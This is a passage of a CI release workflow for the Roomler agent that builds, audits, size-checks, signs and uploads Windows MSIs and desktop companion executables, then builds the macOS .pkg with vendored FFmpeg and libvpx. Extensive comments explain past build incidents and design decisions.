            $r = Audit-Dir -Dir $installDir
            if ($r.Problems.Count -gt 0) {
              $r.Problems | ForEach-Object { Write-Host "::error::[$($f.Name)] $_" }
              throw "$($f.Name) MSI is not self-contained"
            }
            Write-Host "  OK: every import is shipped in the MSI or by Windows"
            Write-Host "  MSI-shipped imports: $($r.AppLocal -join ', ')"
            $lastDir = $installDir
            $lastAppLocal = $r.AppLocal
          }

          # ⚠️ A gate proven only on the passing case is the failure mode this
          # step exists to fix — "it printed OK" is not evidence it can say
          # anything else. Hide a shipped DLL and require a complaint. The
          # victim is chosen from what the binaries ACTUALLY import rather
          # than named up front: hard-coding msvcp140 is precisely how the
          # first version of the installer-smoke control passed vacuously.
          Write-Host '--- 2/2: negative control — removing a shipped import must FAIL the audit ---'
          if ($lastAppLocal.Count -eq 0) {
            throw "NEGATIVE CONTROL IMPOSSIBLE: no imported DLL is shipped in the MSI, so this audit has nothing to detect. Either the CRT bundle is unnecessary in this build, or the dumpbin parse is wrong — both need a human."
          }
          $victim = Join-Path $lastDir $lastAppLocal[0]
          $stash  = "$victim.hidden"
          Write-Host "  hiding $($lastAppLocal[0])"
          Move-Item $victim $stash
          try {
            $neg = Audit-Dir -Dir $lastDir -Quiet
            if ($neg.Problems.Count -eq 0) {
              throw "NEGATIVE CONTROL FAILED: $($lastAppLocal[0]) was removed and the audit still passed — this check cannot detect what it claims to."
            }
            Write-Host "  OK: audit reported $($neg.Problems.Count) problem(s): $($neg.Problems[0])"
          } finally {
            Move-Item $stash $victim
          }

      - name: 'Verify MSI size budget (P4b: MSI carries the tunnel CLI)'
        # Budget history: rc.63 baseline 8 MB (pre-ffmpeg); rc.65's
        # Option B guard capped ffmpeg bloat at a 24 MB hard ceiling;
        # rc.194 measured 20.73 MB per flavour. P4b DELIBERATELY grows
        # the MSI: both flavours now bundle the tunnel CLI roomler.exe
        # (~8 MB compressed; node-stack unification Option A) →
        # expected ≈ 29 MB. The guard's job is unchanged in spirit:
        # catch ACCIDENTAL bloat (unstripped FFmpeg, stray DLLs,
        # debug info, duplicate payloads) on top of the deliberate
        # scope — not the scope itself. Warn above baseline+2 so a
        # creeping regression is visible one release early; hard-fail
        # at 36 MB.
        shell: pwsh
        run: |
          $msiPerUser = (Get-Item "${{ steps.locate.outputs.artifact }}").Length / 1MB
          $msiPerMachine = (Get-Item "${{ steps.locate_pm.outputs.artifact }}").Length / 1MB
          $maxMsi = [math]::Max($msiPerUser, $msiPerMachine)
          # P3e lever D re-baseline. rc.361 measured 31.97 MB with the full
          # 22.1 MiB tunnel CLI inside; the CLI's compressed contribution was
          # ~7.6 MB (measured as the rc.194 -> rc.195 step when P4b added it),
          # and the shim that replaces it is ~0.15 MB. Ceiling drops with it:
          # 36 -> 30 MB, keeping the same ~5 MB of headroom over the baseline
          # that the P4b guard had.
          # Baseline PINNED from the P3e Phase-2 rehearsal (run 31869144675,
          # 2026-08-15, lever-B rehearsal 31877551270): both flavours measured
          # 13.13 MB (minimal vendored FFmpeg). A baseline left above the real value is
          # exactly the silent failure this guard exists to catch — it would
          # swallow a multi-MB regression as "within budget".
          # Roomler SSH (`ssh-server`) is a DELIBERATE growth on top of that
          # baseline: russh measured +1.86 MiB in roomlerd, ~+0.7 MB
          # compressed here. That stays inside the +2 warn band, so the guard
          # is deliberately NOT re-pinned in the same commit that adds it —
          # re-pin from the first measured release run, never from an
          # estimate, or the baseline swallows exactly the regression it
          # exists to catch.
          # FR-85 P4c re-baseline (AC9): the screen recorder and its FFmpeg
          # (the h264 decoder + the aac encoder) are DELIBERATE scope. The
          # unpublished rehearsal of that branch (run 36346825023, 2026-09-27)
          # measured both flavours at 17.67 MB: 0.4.105 (no recorder) was 15.89,
          # the canary with `recording` 17.04, and P4c + everything merged
          # since then +0.63. The old 13.13 baseline had fired the warning on
          # every release since ssh-server, which is noise, not a signal.
          # The ceiling moves 18 -> 22 with it. Against a 17.67 baseline, an 18
          # ceiling sat INSIDE the +2 warn band, so any growth hard-failed a
          # tag with no warning a release earlier, the opposite of this guard's
          # design. 22 restores warn (19.67) before fail, with ~4.3 MB of
          # headroom (the guard has kept ~5 over its baseline since P4b).
          $p4bBaseline = 17.67
          $ceilingMB = 22
          $deltaMB = $maxMsi - $p4bBaseline
          Write-Host "::notice::per-User MSI = $([math]::Round($msiPerUser, 2)) MB"
          Write-Host "::notice::per-Machine MSI = $([math]::Round($msiPerMachine, 2)) MB"
          Write-Host "::notice::baseline = $p4bBaseline MB; delta = $([math]::Round($deltaMB, 2)) MB"
          if ($maxMsi -gt $ceilingMB) {
            Write-Host "::error::MSI exceeds the $ceilingMB MB hard ceiling ($([math]::Round($maxMsi, 2)) MB). Investigate unintended payload growth (unstripped FFmpeg, extra DLLs, debug info, or a full CLI binary back in the TunnelExe component)."
            exit 1
          } elseif ($deltaMB -gt 2) {
            Write-Host "::warning::MSI is $([math]::Round($deltaMB, 2)) MB over the baseline (still under the $ceilingMB MB ceiling). Re-baseline deliberately or investigate."
          } else {
            Write-Host "::notice::MSI within the P4b size budget."
          }

      # The desktop companion EXE is built by the parallel
      # `build-windows-companions` job below (it only needs the agent's
      # DEFAULT feature graph — no vcpkg/FFmpeg/libvpx — and used to add
      # ~9 min of serial tail here).


      - name: SHA256 checksum (both MSIs)
        shell: pwsh
        run: |
          $files = @(
            "${{ steps.locate.outputs.artifact }}",
            "${{ steps.locate_pm.outputs.artifact }}"
          )
          foreach ($f in $files) {
            $hash = (Get-FileHash -Algorithm SHA256 $f).Hash.ToLower()
            "$hash  $f" | Out-File -Encoding ascii "$f.sha256"
          }

      - name: Upload artifacts (per-User + per-Machine MSIs)
        uses: actions/upload-artifact@v4
        with:
          name: windows-msi
          path: |
            ${{ steps.locate.outputs.artifact }}
            ${{ steps.locate.outputs.artifact }}.sha256
            ${{ steps.locate_pm.outputs.artifact }}
            ${{ steps.locate_pm.outputs.artifact }}.sha256
          retention-days: 30

      - name: Save cargo seed (new lockfile generation)
        # always(): preserves cache-on-failure semantics -- a rehearsal
        # that builds and then dies later must still seed (the 07-28
        # incident). Non-tag only: tag-ref saves are unrestorable dead
        # weight. A same-lockfile twin save loses the reservation and
        # warns -- harmless.
        if: always() && github.ref_type != 'tag'
        continue-on-error: true
        uses: ./.github/actions/seed-cache-save
        # GH_TOKEN powers the action's generation-retirement step (keeps
        # the 2 newest generations of this family, deletes the rest) —
        # without it, generations piled to 9.5 GB in a day and LRU evicted
        # the CI lane's caches instead (run 32198738776).
        env:
          GH_TOKEN: ${{ github.token }}
        with:
          shared-key: agent-windows-vp9-444

  # ---------------------------------------------------------------------------
  # 2b. Windows companion — the roomler-desktop EXE, built in PARALLEL with
  #     the MSI job. The crate deps on roomlerd with DEFAULT features
  #     (`default = []`, signalling-only), so this job needs no vcpkg /
  #     FFmpeg / libvpx / LLVM — Tauri 2 + the agent-default graph build on
  #     a bare windows-latest. The MSIs never contained this EXE (it ships
  #     standalone), so the split changes wall-clock only. (P4c-2 retired
  #     the legacy roomler-installer wizard EXE this job also used to build
  #     — the unified roomler-setup wizard ships via release-setup.yml,
  #     which the `dispatch-setup-release` job at the end of this file runs
  #     in LOCKSTEP with every agent release: FR-84 S1.)
  # ---------------------------------------------------------------------------
  build-windows-companions:
    name: Build desktop companion EXE (Windows x86_64)
    needs: validate-version
    runs-on: windows-latest
    timeout-minutes: 60
    # See build-windows: the signing FIC is bound to this environment.
    environment: release
    permissions:
      # contents:WRITE — seed-cache-save publishes to the seed-cache
      # release; read 403'd every upload (see build-windows note).
      contents: write
      id-token: write     # azure/login OIDC inside ./.github/actions/sign-windows
      actions: write      # seed-cache-save generation retirement
    env:
      VERSION: ${{ needs.validate-version.outputs.version }}
    steps:
      - uses: actions/checkout@v4

      - name: Install Rust toolchain
        uses: dtolnay/rust-toolchain@1.95.0

      - name: Restore cargo seed (lockfile-generation keys)
        # Explicit actions/cache with OUR key scheme -- rust-cache cannot
        # express "unique key + prefix restore + no env hash": with
        # add-rust-environment-hash-key:false its `key:` input is folded
        # into the dropped component (a no-op -- #482, re-proven by probe
        # run 31907241610). Unique key per Cargo.lock => saves always
        # land; prefix restore => never an absent-key window (the rc.382
        # race); no env hash => no runner-image warm/cold lottery. Full
        # story in .github/actions/seed-cache-restore. The paired save
        # step is at the end of this job.
        continue-on-error: true
        uses: ./.github/actions/seed-cache-restore
        # GH_TOKEN: the asset-based restore downloads from the seed-cache
        # release (probe run 32903453670 built cold on every lane for want
        # of it — the old actions/cache restore needed no token).
        env:
          GH_TOKEN: ${{ github.token }}
        with:
          shared-key: installer-smoke-windows

      # rc.18: the Tauri tray companion. Tray's Cargo.toml uses
      # `frontendDist: "../src/front"` pointing at static HTML/CSS/JS —
      # no front-end bundler step needed. The build.rs generates
      # placeholder icons if missing so this works without an offline
      # icon-prep step. Released as a plain EXE.
      - name: Build tray binary (release)
        shell: pwsh
        # Static CRT: the desktop companion ships as a raw standalone EXE
        # (placed beside roomlerd.exe by install.ps1 / the wizard), so it
        # must not assume the MSVC runtime exists on the host -- a fresh
        # Windows box without the VC++ redist pops a loader dialog
        # otherwise (field report 2026-07-28). The tray graph is pure
        # Rust (agent DEFAULT features, no vcpkg /MD libs), so
        # +crt-static is safe; link-verified against the Tauri 2 stack.
        env:
          RUSTFLAGS: -C target-feature=+crt-static
        run: cargo build -p roomler-desktop --release

      - name: Locate + rename tray EXE
        id: locate_tray
        shell: pwsh
        run: |
          # P3d Slice B: the tray/desktop-companion OUTPUT binary is now
          # `roomler-desktop.exe` (and since FR-21 P2a the package matches). The
          # released artifact is renamed to match.
          $exe = "target/release/roomler-desktop.exe"
          if (-not (Test-Path $exe)) { throw "roomler-desktop EXE not produced" }
          # Suffix-free: signedness is verified, not encoded in the filename.
          # install.ps1's `-like 'roomler-desktop-*-x86_64-pc-windows-msvc*.exe'`
          # and asset_resolver.rs's contains/ends_with both still match.
          $dst = "roomler-desktop-$env:VERSION-x86_64-pc-windows-msvc.exe"
          Copy-Item $exe $dst
          "artifact=$dst" | Out-File -FilePath $env:GITHUB_OUTPUT -Append

      # The desktop companion is the one EXE a user double-clicks straight
      # from a browser download, so it is the most exposed to SmartScreen and
      # to corporate AV quarantine.
      - name: Sign desktop companion
        id: sign_desktop
        uses: ./.github/actions/sign-windows
        with:
          files:                    ${{ steps.locate_tray.outputs.artifact }}
          description:              'Roomler desktop'
          mode:                     ${{ github.event.inputs.signing_mode || 'auto' }}
          require:                  ${{ needs.validate-version.outputs.is_release == 'true' || github.event.inputs.require_signing == 'true' }}
          expect-subject-contains:  ${{ vars.AZURE_SIGNING_EXPECT_SUBJECT }}
          endpoint:                 ${{ vars.AZURE_SIGNING_ENDPOINT }}
          signing-account-name:     ${{ vars.AZURE_SIGNING_ACCOUNT }}
          certificate-profile-name: ${{ vars.AZURE_SIGNING_PROFILE }}
          azure-client-id:          ${{ vars.AZURE_CLIENT_ID }}
          azure-tenant-id:          ${{ vars.AZURE_TENANT_ID }}
          azure-subscription-id:    ${{ vars.AZURE_SUBSCRIPTION_ID }}
          local-pfx-base64:         ${{ secrets.WIN_TEST_PFX_BASE64 }}
          local-pfx-password:       ${{ secrets.WIN_TEST_PFX_PASSWORD }}

      - name: SHA256 checksum (desktop companion)
        shell: pwsh
        run: |
          $files = @(
            "${{ steps.locate_tray.outputs.artifact }}"
          )
          foreach ($f in $files) {
            $hash = (Get-FileHash -Algorithm SHA256 $f).Hash.ToLower()
            "$hash  $f" | Out-File -Encoding ascii "$f.sha256"
          }

      - name: Upload artifacts (desktop companion)
        uses: actions/upload-artifact@v4
        with:
          name: windows-companions
          path: |
            ${{ steps.locate_tray.outputs.artifact }}
            ${{ steps.locate_tray.outputs.artifact }}.sha256
          retention-days: 30

      - name: Save cargo seed (new lockfile generation)
        # always(): preserves cache-on-failure semantics -- a rehearsal
        # that builds and then dies later must still seed (the 07-28
        # incident). Non-tag only: tag-ref saves are unrestorable dead
        # weight. A same-lockfile twin save loses the reservation and
        # warns -- harmless.
        if: always() && github.ref_type != 'tag'
        continue-on-error: true
        uses: ./.github/actions/seed-cache-save
        # GH_TOKEN powers the action's generation-retirement step (keeps
        # the 2 newest generations of this family, deletes the rest) —
        # without it, generations piled to 9.5 GB in a day and LRU evicted
        # the CI lane's caches instead (run 32198738776).
        env:
          GH_TOKEN: ${{ github.token }}
        with:
          shared-key: installer-smoke-windows

  # ---------------------------------------------------------------------------
  # 2c. macOS companion — roomler-desktop, built in PARALLEL with the .pkg job
  #     (FR-6 wave 18, #773). It was the last step build-macos ran before
  #     staging, and the .pkg job is the release's long pole: on agent-v0.4.112
  #     to 0.4.114 the job took 12.2 min, 158–177 s of it this build, after a
  #     450–603 s agent build. The crate needs none of that job's setup (its
  #     deps are agent-core + localapi + Tauri: no brew libvpx, no FFmpeg, no
  #     roomlerd), so it builds on a bare macos-15 while the agent compiles,
  #     and build-macos picks the binary up at the point it used to build it.
  #     Signing, staging and the .app checks stay in build-macos, unchanged.
  #
  #     ⚠️ The artifact is the raw, EXTENSIONLESS binary on purpose: the
  #     release job publishes every downloaded file matching
  #     *.msi/*.pkg/*.deb/*.exe/*.tar.gz/*.sha256, so packing this into a
  #     .tar.gz would publish an intermediate as a release asset.
  # ---------------------------------------------------------------------------
  build-macos-companion:
    name: Build desktop companion (macOS arm64)
    needs: validate-version
    # Same pinned image as build-macos (see there).
    runs-on: macos-15
    timeout-minutes: 60
    steps:
      - uses: actions/checkout@v4

      - name: Install Rust toolchain (aarch64-apple-darwin)
        uses: dtolnay/rust-toolchain@1.95.0
        with:
          targets: aarch64-apple-darwin

      - name: Restore cargo seed (lockfile-generation keys)
        # Its OWN family: the agent-macos seed stops carrying the companion's
        # artifacts now that build-macos no longer builds it. Same scheme as
        # every other lane (see build-macos and .github/actions/seed-cache-restore).
        continue-on-error: true
        uses: ./.github/actions/seed-cache-restore
        env:
          GH_TOKEN: ${{ github.token }}
        with:
          shared-key: agent-macos-companion

      # `custom-protocol` is on unconditionally in its Cargo.toml, so a plain
      # `cargo build` embeds the frontend and no Tauri toolchain is needed on
      # the runner (the same reason the Windows lane uses `cargo build`).
      - name: Build the desktop companion
        run: cargo build -p roomler-desktop --release --target aarch64-apple-darwin

      - name: Upload the companion binary (for build-macos)
        uses: actions/upload-artifact@v4
        with:
          name: macos-companion
          path: target/aarch64-apple-darwin/release/roomler-desktop
          if-no-files-found: error
          # A re-run of this job replaces it rather than failing on the name.
          overwrite: true
          # Consumed within this run only.
          retention-days: 1

      - name: Save cargo seed (new lockfile generation)
        # always(): preserves cache-on-failure semantics -- a rehearsal
        # that builds and then dies later must still seed (the 07-28
        # incident). Non-tag only: tag-ref saves are unrestorable dead
        # weight. A same-lockfile twin save loses the reservation and
        # warns -- harmless.
        if: always() && github.ref_type != 'tag'
        continue-on-error: true
        uses: ./.github/actions/seed-cache-save
        env:
          GH_TOKEN: ${{ github.token }}
        with:
          shared-key: agent-macos-companion

  # ---------------------------------------------------------------------------
  # 3. macOS — signed + notarised .pkg. Unsigned unless Apple secrets present.
  # ---------------------------------------------------------------------------
  build-macos:
    name: Build .pkg (macOS arm64)
    needs: validate-version
    # macos-15, pinned, not `macos-latest`: GitHub retires macos-14 by
    # 2026-11-02 (brownouts from 10-05), and a floating label would move the
    # build — and the bundled dylibs' minimum macOS — without a commit.
    runs-on: macos-15
    timeout-minutes: 180
    env:
      VERSION: ${{ needs.validate-version.outputs.version }}
      # The minimum macOS this .pkg supports, enforced three ways from this ONE
      # value: the installer gate (scripts/macos-productbuild-gated.sh), both
      # Info.plists' LSMinimumSystemVersion, and the bundle check that fails the
      # build when anything shipped needs a newer macOS. 15.0 since the move off
      # macos-14: Homebrew no longer publishes a macOS 14 libvpx bottle, and on
      # 0.4.115 the bundled libvpx + FFmpeg dylibs already required 14.0 (the
      # Rust binaries 11.0). The operator chose to raise it rather than build
      # libvpx ourselves (2026-10-02).
      MACOS_FLOOR: "15.0"
      # Mirror the signing secrets into env once so the `if:` guards below can
      # reference `env.*` instead of `secrets.*` (secrets are not allowed in
      # step-level `if:` conditions).
      APP_P12_BASE64:       ${{ secrets.APPLE_DEVELOPER_ID_APP_P12_BASE64 }}
      INSTALLER_P12_BASE64: ${{ secrets.APPLE_DEVELOPER_ID_INSTALLER_P12_BASE64 }}
      CERT_PASSWORD:        ${{ secrets.APPLE_CERT_PASSWORD }}
      APPLE_API_KEY_ID:        ${{ secrets.APPLE_API_KEY_ID }}
      APPLE_API_ISSUER_ID:     ${{ secrets.APPLE_API_ISSUER_ID }}
      APPLE_API_KEY_P8_BASE64: ${{ secrets.APPLE_API_KEY_P8_BASE64 }}
    steps:
      - uses: actions/checkout@v4

      # Apple signing is ALL-OR-NOTHING, and this runs first so a
      # misconfiguration fails in seconds rather than after a 90-minute build.
      #
      # The old two-gate arrangement had two failure modes. Loud one: the
      # import step was gated on APP_P12 but `security import`ed the INSTALLER
      # p12 unconditionally under `set -euo pipefail`, so a half-configured
      # run died with an opaque keychain error. Silent one, and much worse:
      # `Warn on unsigned` only fired when signed != 'yes', so a .pkg that was
      # correctly Developer-ID-signed but NEVER NOTARISED published with no
      # warning at all -- and Gatekeeper refuses those on every end-user Mac.
      - name: Resolve Apple signing mode
        id: apple
        shell: bash
        run: |
          set -euo pipefail
          req=(APP_P12_BASE64 INSTALLER_P12_BASE64 CERT_PASSWORD
               APPLE_API_KEY_ID APPLE_API_ISSUER_ID APPLE_API_KEY_P8_BASE64)
          have=(); miss=()
          for v in "${req[@]}"; do
            if [[ -n "${!v:-}" ]]; then have+=("$v"); else miss+=("$v"); fi
          done

          if [[ ${#miss[@]} -eq 0 ]]; then
            mode=full
          elif [[ ${#have[@]} -eq 0 ]]; then
            mode=none
          else
            echo "::error::Apple credentials are PARTIALLY configured (missing: ${miss[*]}). Signing is all-or-nothing: a half-configured run can only produce a signed-but-unnotarised or an unsigned-but-pkg-signed artifact, both of which Gatekeeper rejects. Run scripts/signing/60-apple-setup.sh check."
            exit 1
          fi

          if [[ "$mode" == none ]]; then
            # Deliberately a WARNING, not a failure, until Apple enrolment
            # completes (blocked on D-U-N-S — scripts/signing/60-apple-setup.sh).
            #
            # This gate hard-failed release tags when it landed with #599, and
            # the cost was out of all proportion to the risk: agent-v0.3.0-rc.453
            # died here after 10 seconds, and because `Publish GitHub Release`
            # needs every build job, it took the four HEALTHY lanes with it —
            # the .deb x86_64, the .deb aarch64, the .msi and the companion EXE
            # had all built successfully and none of them was published. One
            # unconfigured platform must not be able to stop the fleet's releases.
            #
            # The premise was also too strong. Gatekeeper's assessment is
            # triggered by the com.apple.quarantine xattr, which a browser sets
            # and `curl` does not, so the path our own installer uses —
            # `curl … | sh` → `sudo installer -pkg` — installs an unsigned .pkg
            # without complaint. Verified on a brand-new MacBook on 2026-08-23
            # ("The install was successful"). What notarisation actually buys is
            # the Finder double-click path, plus tamper-evidence — worth having,
            # not worth blocking every Linux and Windows release for.
            if [[ "${{ needs.validate-version.outputs.is_release }}" == "true" ]]; then
              echo "::warning::RELEASING AN UNSIGNED, UNNOTARISED .pkg. It installs fine via install.sh (curl sets no quarantine xattr) but Finder double-click will be refused, and the download has no tamper-evidence. Configure the six APPLE_* secrets to fix: scripts/signing/60-apple-setup.sh."
            else
              echo "::warning::Apple credentials absent -- the .pkg will be unsigned and unnotarised (artifacts-only run, so this is allowed)."
            fi
          fi

          echo "mode=$mode" >> "$GITHUB_OUTPUT"
          echo "Apple signing mode: $mode"

      - name: Install Rust toolchain (aarch64-apple-darwin)
        uses: dtolnay/rust-toolchain@1.95.0
        with:
          targets: aarch64-apple-darwin

      - name: Restore cargo seed (lockfile-generation keys)
        # Explicit actions/cache with OUR key scheme -- rust-cache cannot
        # express "unique key + prefix restore + no env hash": with
        # add-rust-environment-hash-key:false its `key:` input is folded
        # into the dropped component (a no-op -- #482, re-proven by probe
        # run 31907241610). Unique key per Cargo.lock => saves always
        # land; prefix restore => never an absent-key window (the rc.382
        # race); no env hash => no runner-image warm/cold lottery. Full
        # story in .github/actions/seed-cache-restore. The paired save
        # step is at the end of this job.
        continue-on-error: true
        uses: ./.github/actions/seed-cache-restore
        # GH_TOKEN: the asset-based restore downloads from the seed-cache
        # release (probe run 32903453670 built cold on every lane for want
        # of it — the old actions/cache restore needed no token).
        env:
          GH_TOKEN: ${{ github.token }}
        with:
          shared-key: agent-macos

      - name: Install system deps
        # libvpx for the `vp9-444` feature; pkg-config for the
        # env-libvpx-sys build script.
        #
        # ⚠️ Do NOT encode brew's libvpx version in a comment and rely on it —
        # this said "currently 1.15" and brew served 1.16.0 on 2026-09-03,
        # having served 1.17.0 earlier. The version is not ours to pin and it
        # moves without notice; the step below is what makes that survivable.
        run: brew install cmake libvpx pkg-config

      - name: Drop cached libvpx build artefacts (brew version drifts)
        # 🔑 The seed cache carries `env-libvpx-sys`'s build-script OUTPUT,
        # which bakes an ABSOLUTE, VERSIONED library path
        # (`-L /opt/homebrew/Cellar/libvpx/<version>/lib`). When brew's version
        # moves under a restored cache, the linker is handed a Cellar path that
        # no longer exists and the build dies at the very end:
        #
        #   ld: warning: search path '/opt/homebrew/Cellar/libvpx/1.17.0/lib' not found
        #   ld: library 'vpx' not found
        #
        # Measured on `agent-v0.4.54`: brew poured 1.16.0 while the cache
        # insisted on 1.17.0, the macOS .pkg failed, and because Publish is
        # gated on every platform the WHOLE RELEASE was skipped — a tag with no
        # artifacts. Dropping just this crate's build dir forces its script to
        # re-run against whatever brew actually installed; everything else in
        # the cache (the expensive part) is kept.
        run: |
          set -euo pipefail
          echo "brew libvpx: $(brew --prefix libvpx 2>/dev/null || echo '(none)')"
          rm -rfv target/aarch64-apple-darwin/release/build/*libvpx* \
                  target/aarch64-apple-darwin/release/build/*vpx_sys* 2>/dev/null || true
          echo "stale libvpx build artefacts cleared"

      - name: Fetch vendored FFmpeg 9.0.1 (macOS arm64 — VideoToolbox)
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          set -euo pipefail
          # NOTE (FR-62 A2): NO patch drift gate here, deliberately. This
          # macOS build is --disable-everything + the three *_videotoolbox
          # encoders only, so libavcodec/nvenc.c (what 0001 patches) is never
          # compiled in — the nvenc patch does not apply to what ships on a
          # Mac. When 0002-videotoolbox-runtime-bitrate lands (FR-62 A3), wire
          # vendor-ffmpeg-macos.yml to apply patches + emit ROOMLER-PATCHES.txt
          # and add the Linux/Windows-twin gate below.
          # Built once by vendor-ffmpeg-macos.yml and reused here, same
          # prebuild-once model as the Linux lane. That workflow configures
          # --disable-autodetect --disable-xlib --disable-libxcb, so this
          # artifact carries NO Homebrew dependency — which is the whole
          # reason ffmpeg-encoder can come back to this platform at all.
          #
          # It is also minimal (--disable-everything + the three
          # *_videotoolbox encoders): 775 KB packed, ~1.8 MB of dylibs,
          # against ~20 MB for the untrimmed tree that would have doubled
          # the .pkg. FR-85 P4c added `-h264dec-aac` (the software h264
          # decoder the recorder's editor needs and the aac encoder for its
          # sound; 1,071,108 B packed, ~3.0 MB of dylibs); rollback = drop it.
          mkdir -p /tmp/ffdl "$RUNNER_TEMP/roomler-ffmpeg"
          gh release download vendored-ffmpeg-9.0.1 \
            --repo "${{ github.repository }}" \
            --pattern 'ffmpeg-9.0.1-macos-arm64-lgpl-shared-h264dec-aac.tar.xz' \
            --dir /tmp/ffdl --clobber
          # NOTE: no --strip-components. The macOS tarball is packed as
          # `tar cJf … lib include` from the install prefix, so lib/ and
          # include/ are already at the root — unlike the Linux one, which
          # has a wrapping directory and does strip 1.
          tar xf /tmp/ffdl/ffmpeg-9.0.1-macos-arm64-lgpl-shared-h264dec-aac.tar.xz \
            -C "$RUNNER_TEMP/roomler-ffmpeg"
          # BSD sed needs an explicit (empty) backup suffix; GNU `sed -i`
          # would silently create files named after the next argument.
          sed -i '' "s|^prefix=.*|prefix=$RUNNER_TEMP/roomler-ffmpeg|" \
            "$RUNNER_TEMP/roomler-ffmpeg"/lib/pkgconfig/*.pc
          {
            echo "FFMPEG_DIR=$RUNNER_TEMP/roomler-ffmpeg"
            echo "PKG_CONFIG_PATH=$RUNNER_TEMP/roomler-ffmpeg/lib/pkgconfig"
          } >> "$GITHUB_ENV"
          echo "=== vendored dylibs ==="
          ls -1 "$RUNNER_TEMP/roomler-ffmpeg/lib"/*.dylib | sed 's|.*/|    |'
          # Fail here rather than at link time if the artifact is the old
          # poisoned build — it is the cheapest place to catch it, and the
          # failure mode it prevents is every Mac dying at launch.
          if grep -rqa -E '/opt/homebrew|/usr/local/' "$RUNNER_TEMP/roomler-ffmpeg/lib"/*.dylib; then
            echo "::error::vendored FFmpeg carries Homebrew paths — re-run vendor-ffmpeg-macos.yml"
            exit 1
          fi
          echo "  clean (no Homebrew/usr-local references)"

      # `ffmpeg-encoder` is BACK on macOS as of this change. It was removed in
      # rc.453 because it was both useless and actively fatal, and BOTH of
      # those conditions have now been retired:
      #
      #   * Useless: `encode/ffmpeg/encoder.rs` dispatches by NAME, and every
      #     name was NVIDIA/Intel/AMD — none of which exists on Apple silicon,
      #     so `find_encoder_by_name` returned None for all of them. #674 added
      #     the `*_videotoolbox` rungs, so HEVC and H.264 now resolve to Apple's
      #     media engine. (`av1_videotoolbox` is in the table too but is NOT in
      #     the registry on current SDKs — measured, not assumed; the cascade
      #     falls through cleanly and caps.rs simply doesn't advertise AV1.)
      #
      #   * Fatal: the six dylibs were built on a runner with Homebrew, so
      #     configure autodetected X11 and baked /opt/homebrew/... into them.
      #     Nothing on an end-user Mac provides those, so dyld aborted at
      #     launch — field-hit on a brand-new MacBook, 2026-08-23, on rc.452.
      #     vendor-ffmpeg-macos.yml now configures --disable-autodetect (the
      #     general fix, not just the two named libs), the fetch step above
      #     re-checks the artifact, and the staging step's /opt scan is the
      #     backstop on the assembled .app.
      #
      # ⚠️ Keep all three of those checks. The launch crash was invisible on
      # the builder — a Mac WITH Homebrew runs the poisoned binary fine, which
      # is exactly why it shipped.
      - name: Build agent (release, full + vp9-444 + vp9-444-bindgen + ffmpeg-encoder)
        # `vp9-444-bindgen` runs bindgen against brew's libvpx 1.16
        # headers — env-libvpx-sys's pre-generated bindings only cover
        # 1.13.0, so without bindgen the build script panics looking
        # for `generated/vpx-ffi-1.16.0.rs`. macOS bindgen + libclang
        # has none of the Windows opaque-struct issue, so this just
        # works.
        # `overlay-l3` (Phase 3b): the overlay mesh (WireGuard + TUN, utun
        # on macOS — in-kernel, no extra dep). Default-OFF (config
        # `overlay_enabled`), inert until an operator opts a host in.
        # `full` includes `audio` → cpal CoreAudio (in the OS SDK, no extra
        # lib) + audiopus (bundled libopus via CMake).
        # Video on macOS is no longer SW-only. `ffmpeg-encoder` + the
        # `*_videotoolbox` rungs put HEVC and H.264 on Apple's media engine
        # for data-channel sessions; openh264 (statically linked) still
        # serves the legacy RTP track, and libvpx still serves VP9-4:4:4,
        # which stays the pick when a viewer asks for crisp 4:4:4 text
        # (VideoToolbox HEVC has no 4:4:4).
        #
        # Dynamic non-system deps are now libvpx AND the four FFmpeg dylibs.
        # Neither needs a staging line: the bundling step below walks
        # `otool -L` recursively and copies whatever the binary actually
        # links, which is why adding a library here required no change there.
        #
        # ⚠️ FR-27 / FR-97 P2b — `viewer-indicator-macos`, the native consent
        # panel, is in this set, and turning it on was a decision, not a
        # cleanup.
        #
        # The feature does not merely add a window: it moves tokio OFF the main
        # thread in `main.rs`, because AppKit will not deliver a click to an
        # Approve button while `#[tokio::main]` parks the main run loop. That
        # is a change to how every macOS agent STARTS, and macOS updates are
        # owned by the root helper — a daemon that fails to start cannot pull
        # its own fix, so recovery is a manual reinstall per Mac.
        #
        # So it went through the real-Mac procedure first: a `workflow_dispatch`
        # artifact with the feature, on a real Mac, where the daemon started AND
        # a prompt both appeared and answered (FR-97 P2b, §8). Taking it out
        # again sends macOS prompts back to the desktop companion, which works.
        env:
          CMAKE_POLICY_VERSION_MINIMUM: "3.5"
        run: cargo build -p roomlerd --release --features "full,hive,vp9-444,vp9-444-bindgen,overlay-l3,overlay-netstack,ssh-server,ffmpeg-encoder,viewer-indicator-macos" --target aarch64-apple-darwin

      # The `roomler` CLI. macOS shipped WITHOUT one until rc.454 — the pkg
      # payload was the .app and nothing else — so `roomler peers` was
      # impossible on a Mac despite the daemon carrying the entire command
      # surface behind `roomlerd cli`. Same ~150 KB shim as the .deb and the
      # MSI (P3e lever D); it lands at /usr/local/bin/roomler below.
      - name: Build the roomler CLI shim
        run: cargo build -p roomler-cli-shim --release --target aarch64-apple-darwin

      # The desktop companion — the macOS counterpart of roomler-desktop.exe —
      # is built by the parallel `build-macos-companion` job (FR-6 wave 18).
      # Collect it where this job used to build it: the staging step below
      # copies `target/aarch64-apple-darwin/release/roomler-desktop` into the
      # .app. The agent build above takes 7.5–10 min and the companion ~3, so
      # it is normally waiting already.
      #
      # ⚠️ Waits on the JOB, not on the artifact listing: a failed or skipped
      # companion job fails this step at once, instead of after the timeout.
      - name: Wait for the desktop companion (built in parallel)
        env:
          GH_TOKEN: ${{ github.token }}
          # The `name:` of the build-macos-companion job.
          COMPANION_JOB: Build desktop companion (macOS arm64)
        run: |
          set -euo pipefail
          for i in $(seq 1 180); do # 30 min at 10 s
            state=$(gh api "repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/jobs?filter=latest&per_page=100" \
              --jq '.jobs[] | select(.name == env.COMPANION_JOB) | "\(.status) \(.conclusion // "")"' | head -n1)
            case "$state" in
              "completed success")
                echo "companion ready (waited $(( (i - 1) * 10 )) s)"
                exit 0 ;;
              completed*)
                echo "::error::'$COMPANION_JOB' finished '${state#completed }', so there is no companion to package"
                exit 1 ;;
            esac
            sleep 10
          done
          echo "::error::'$COMPANION_JOB' did not finish within 30 min"
          exit 1

      - name: Download the desktop companion
        uses: actions/download-artifact@v4
        with:
          name: macos-companion
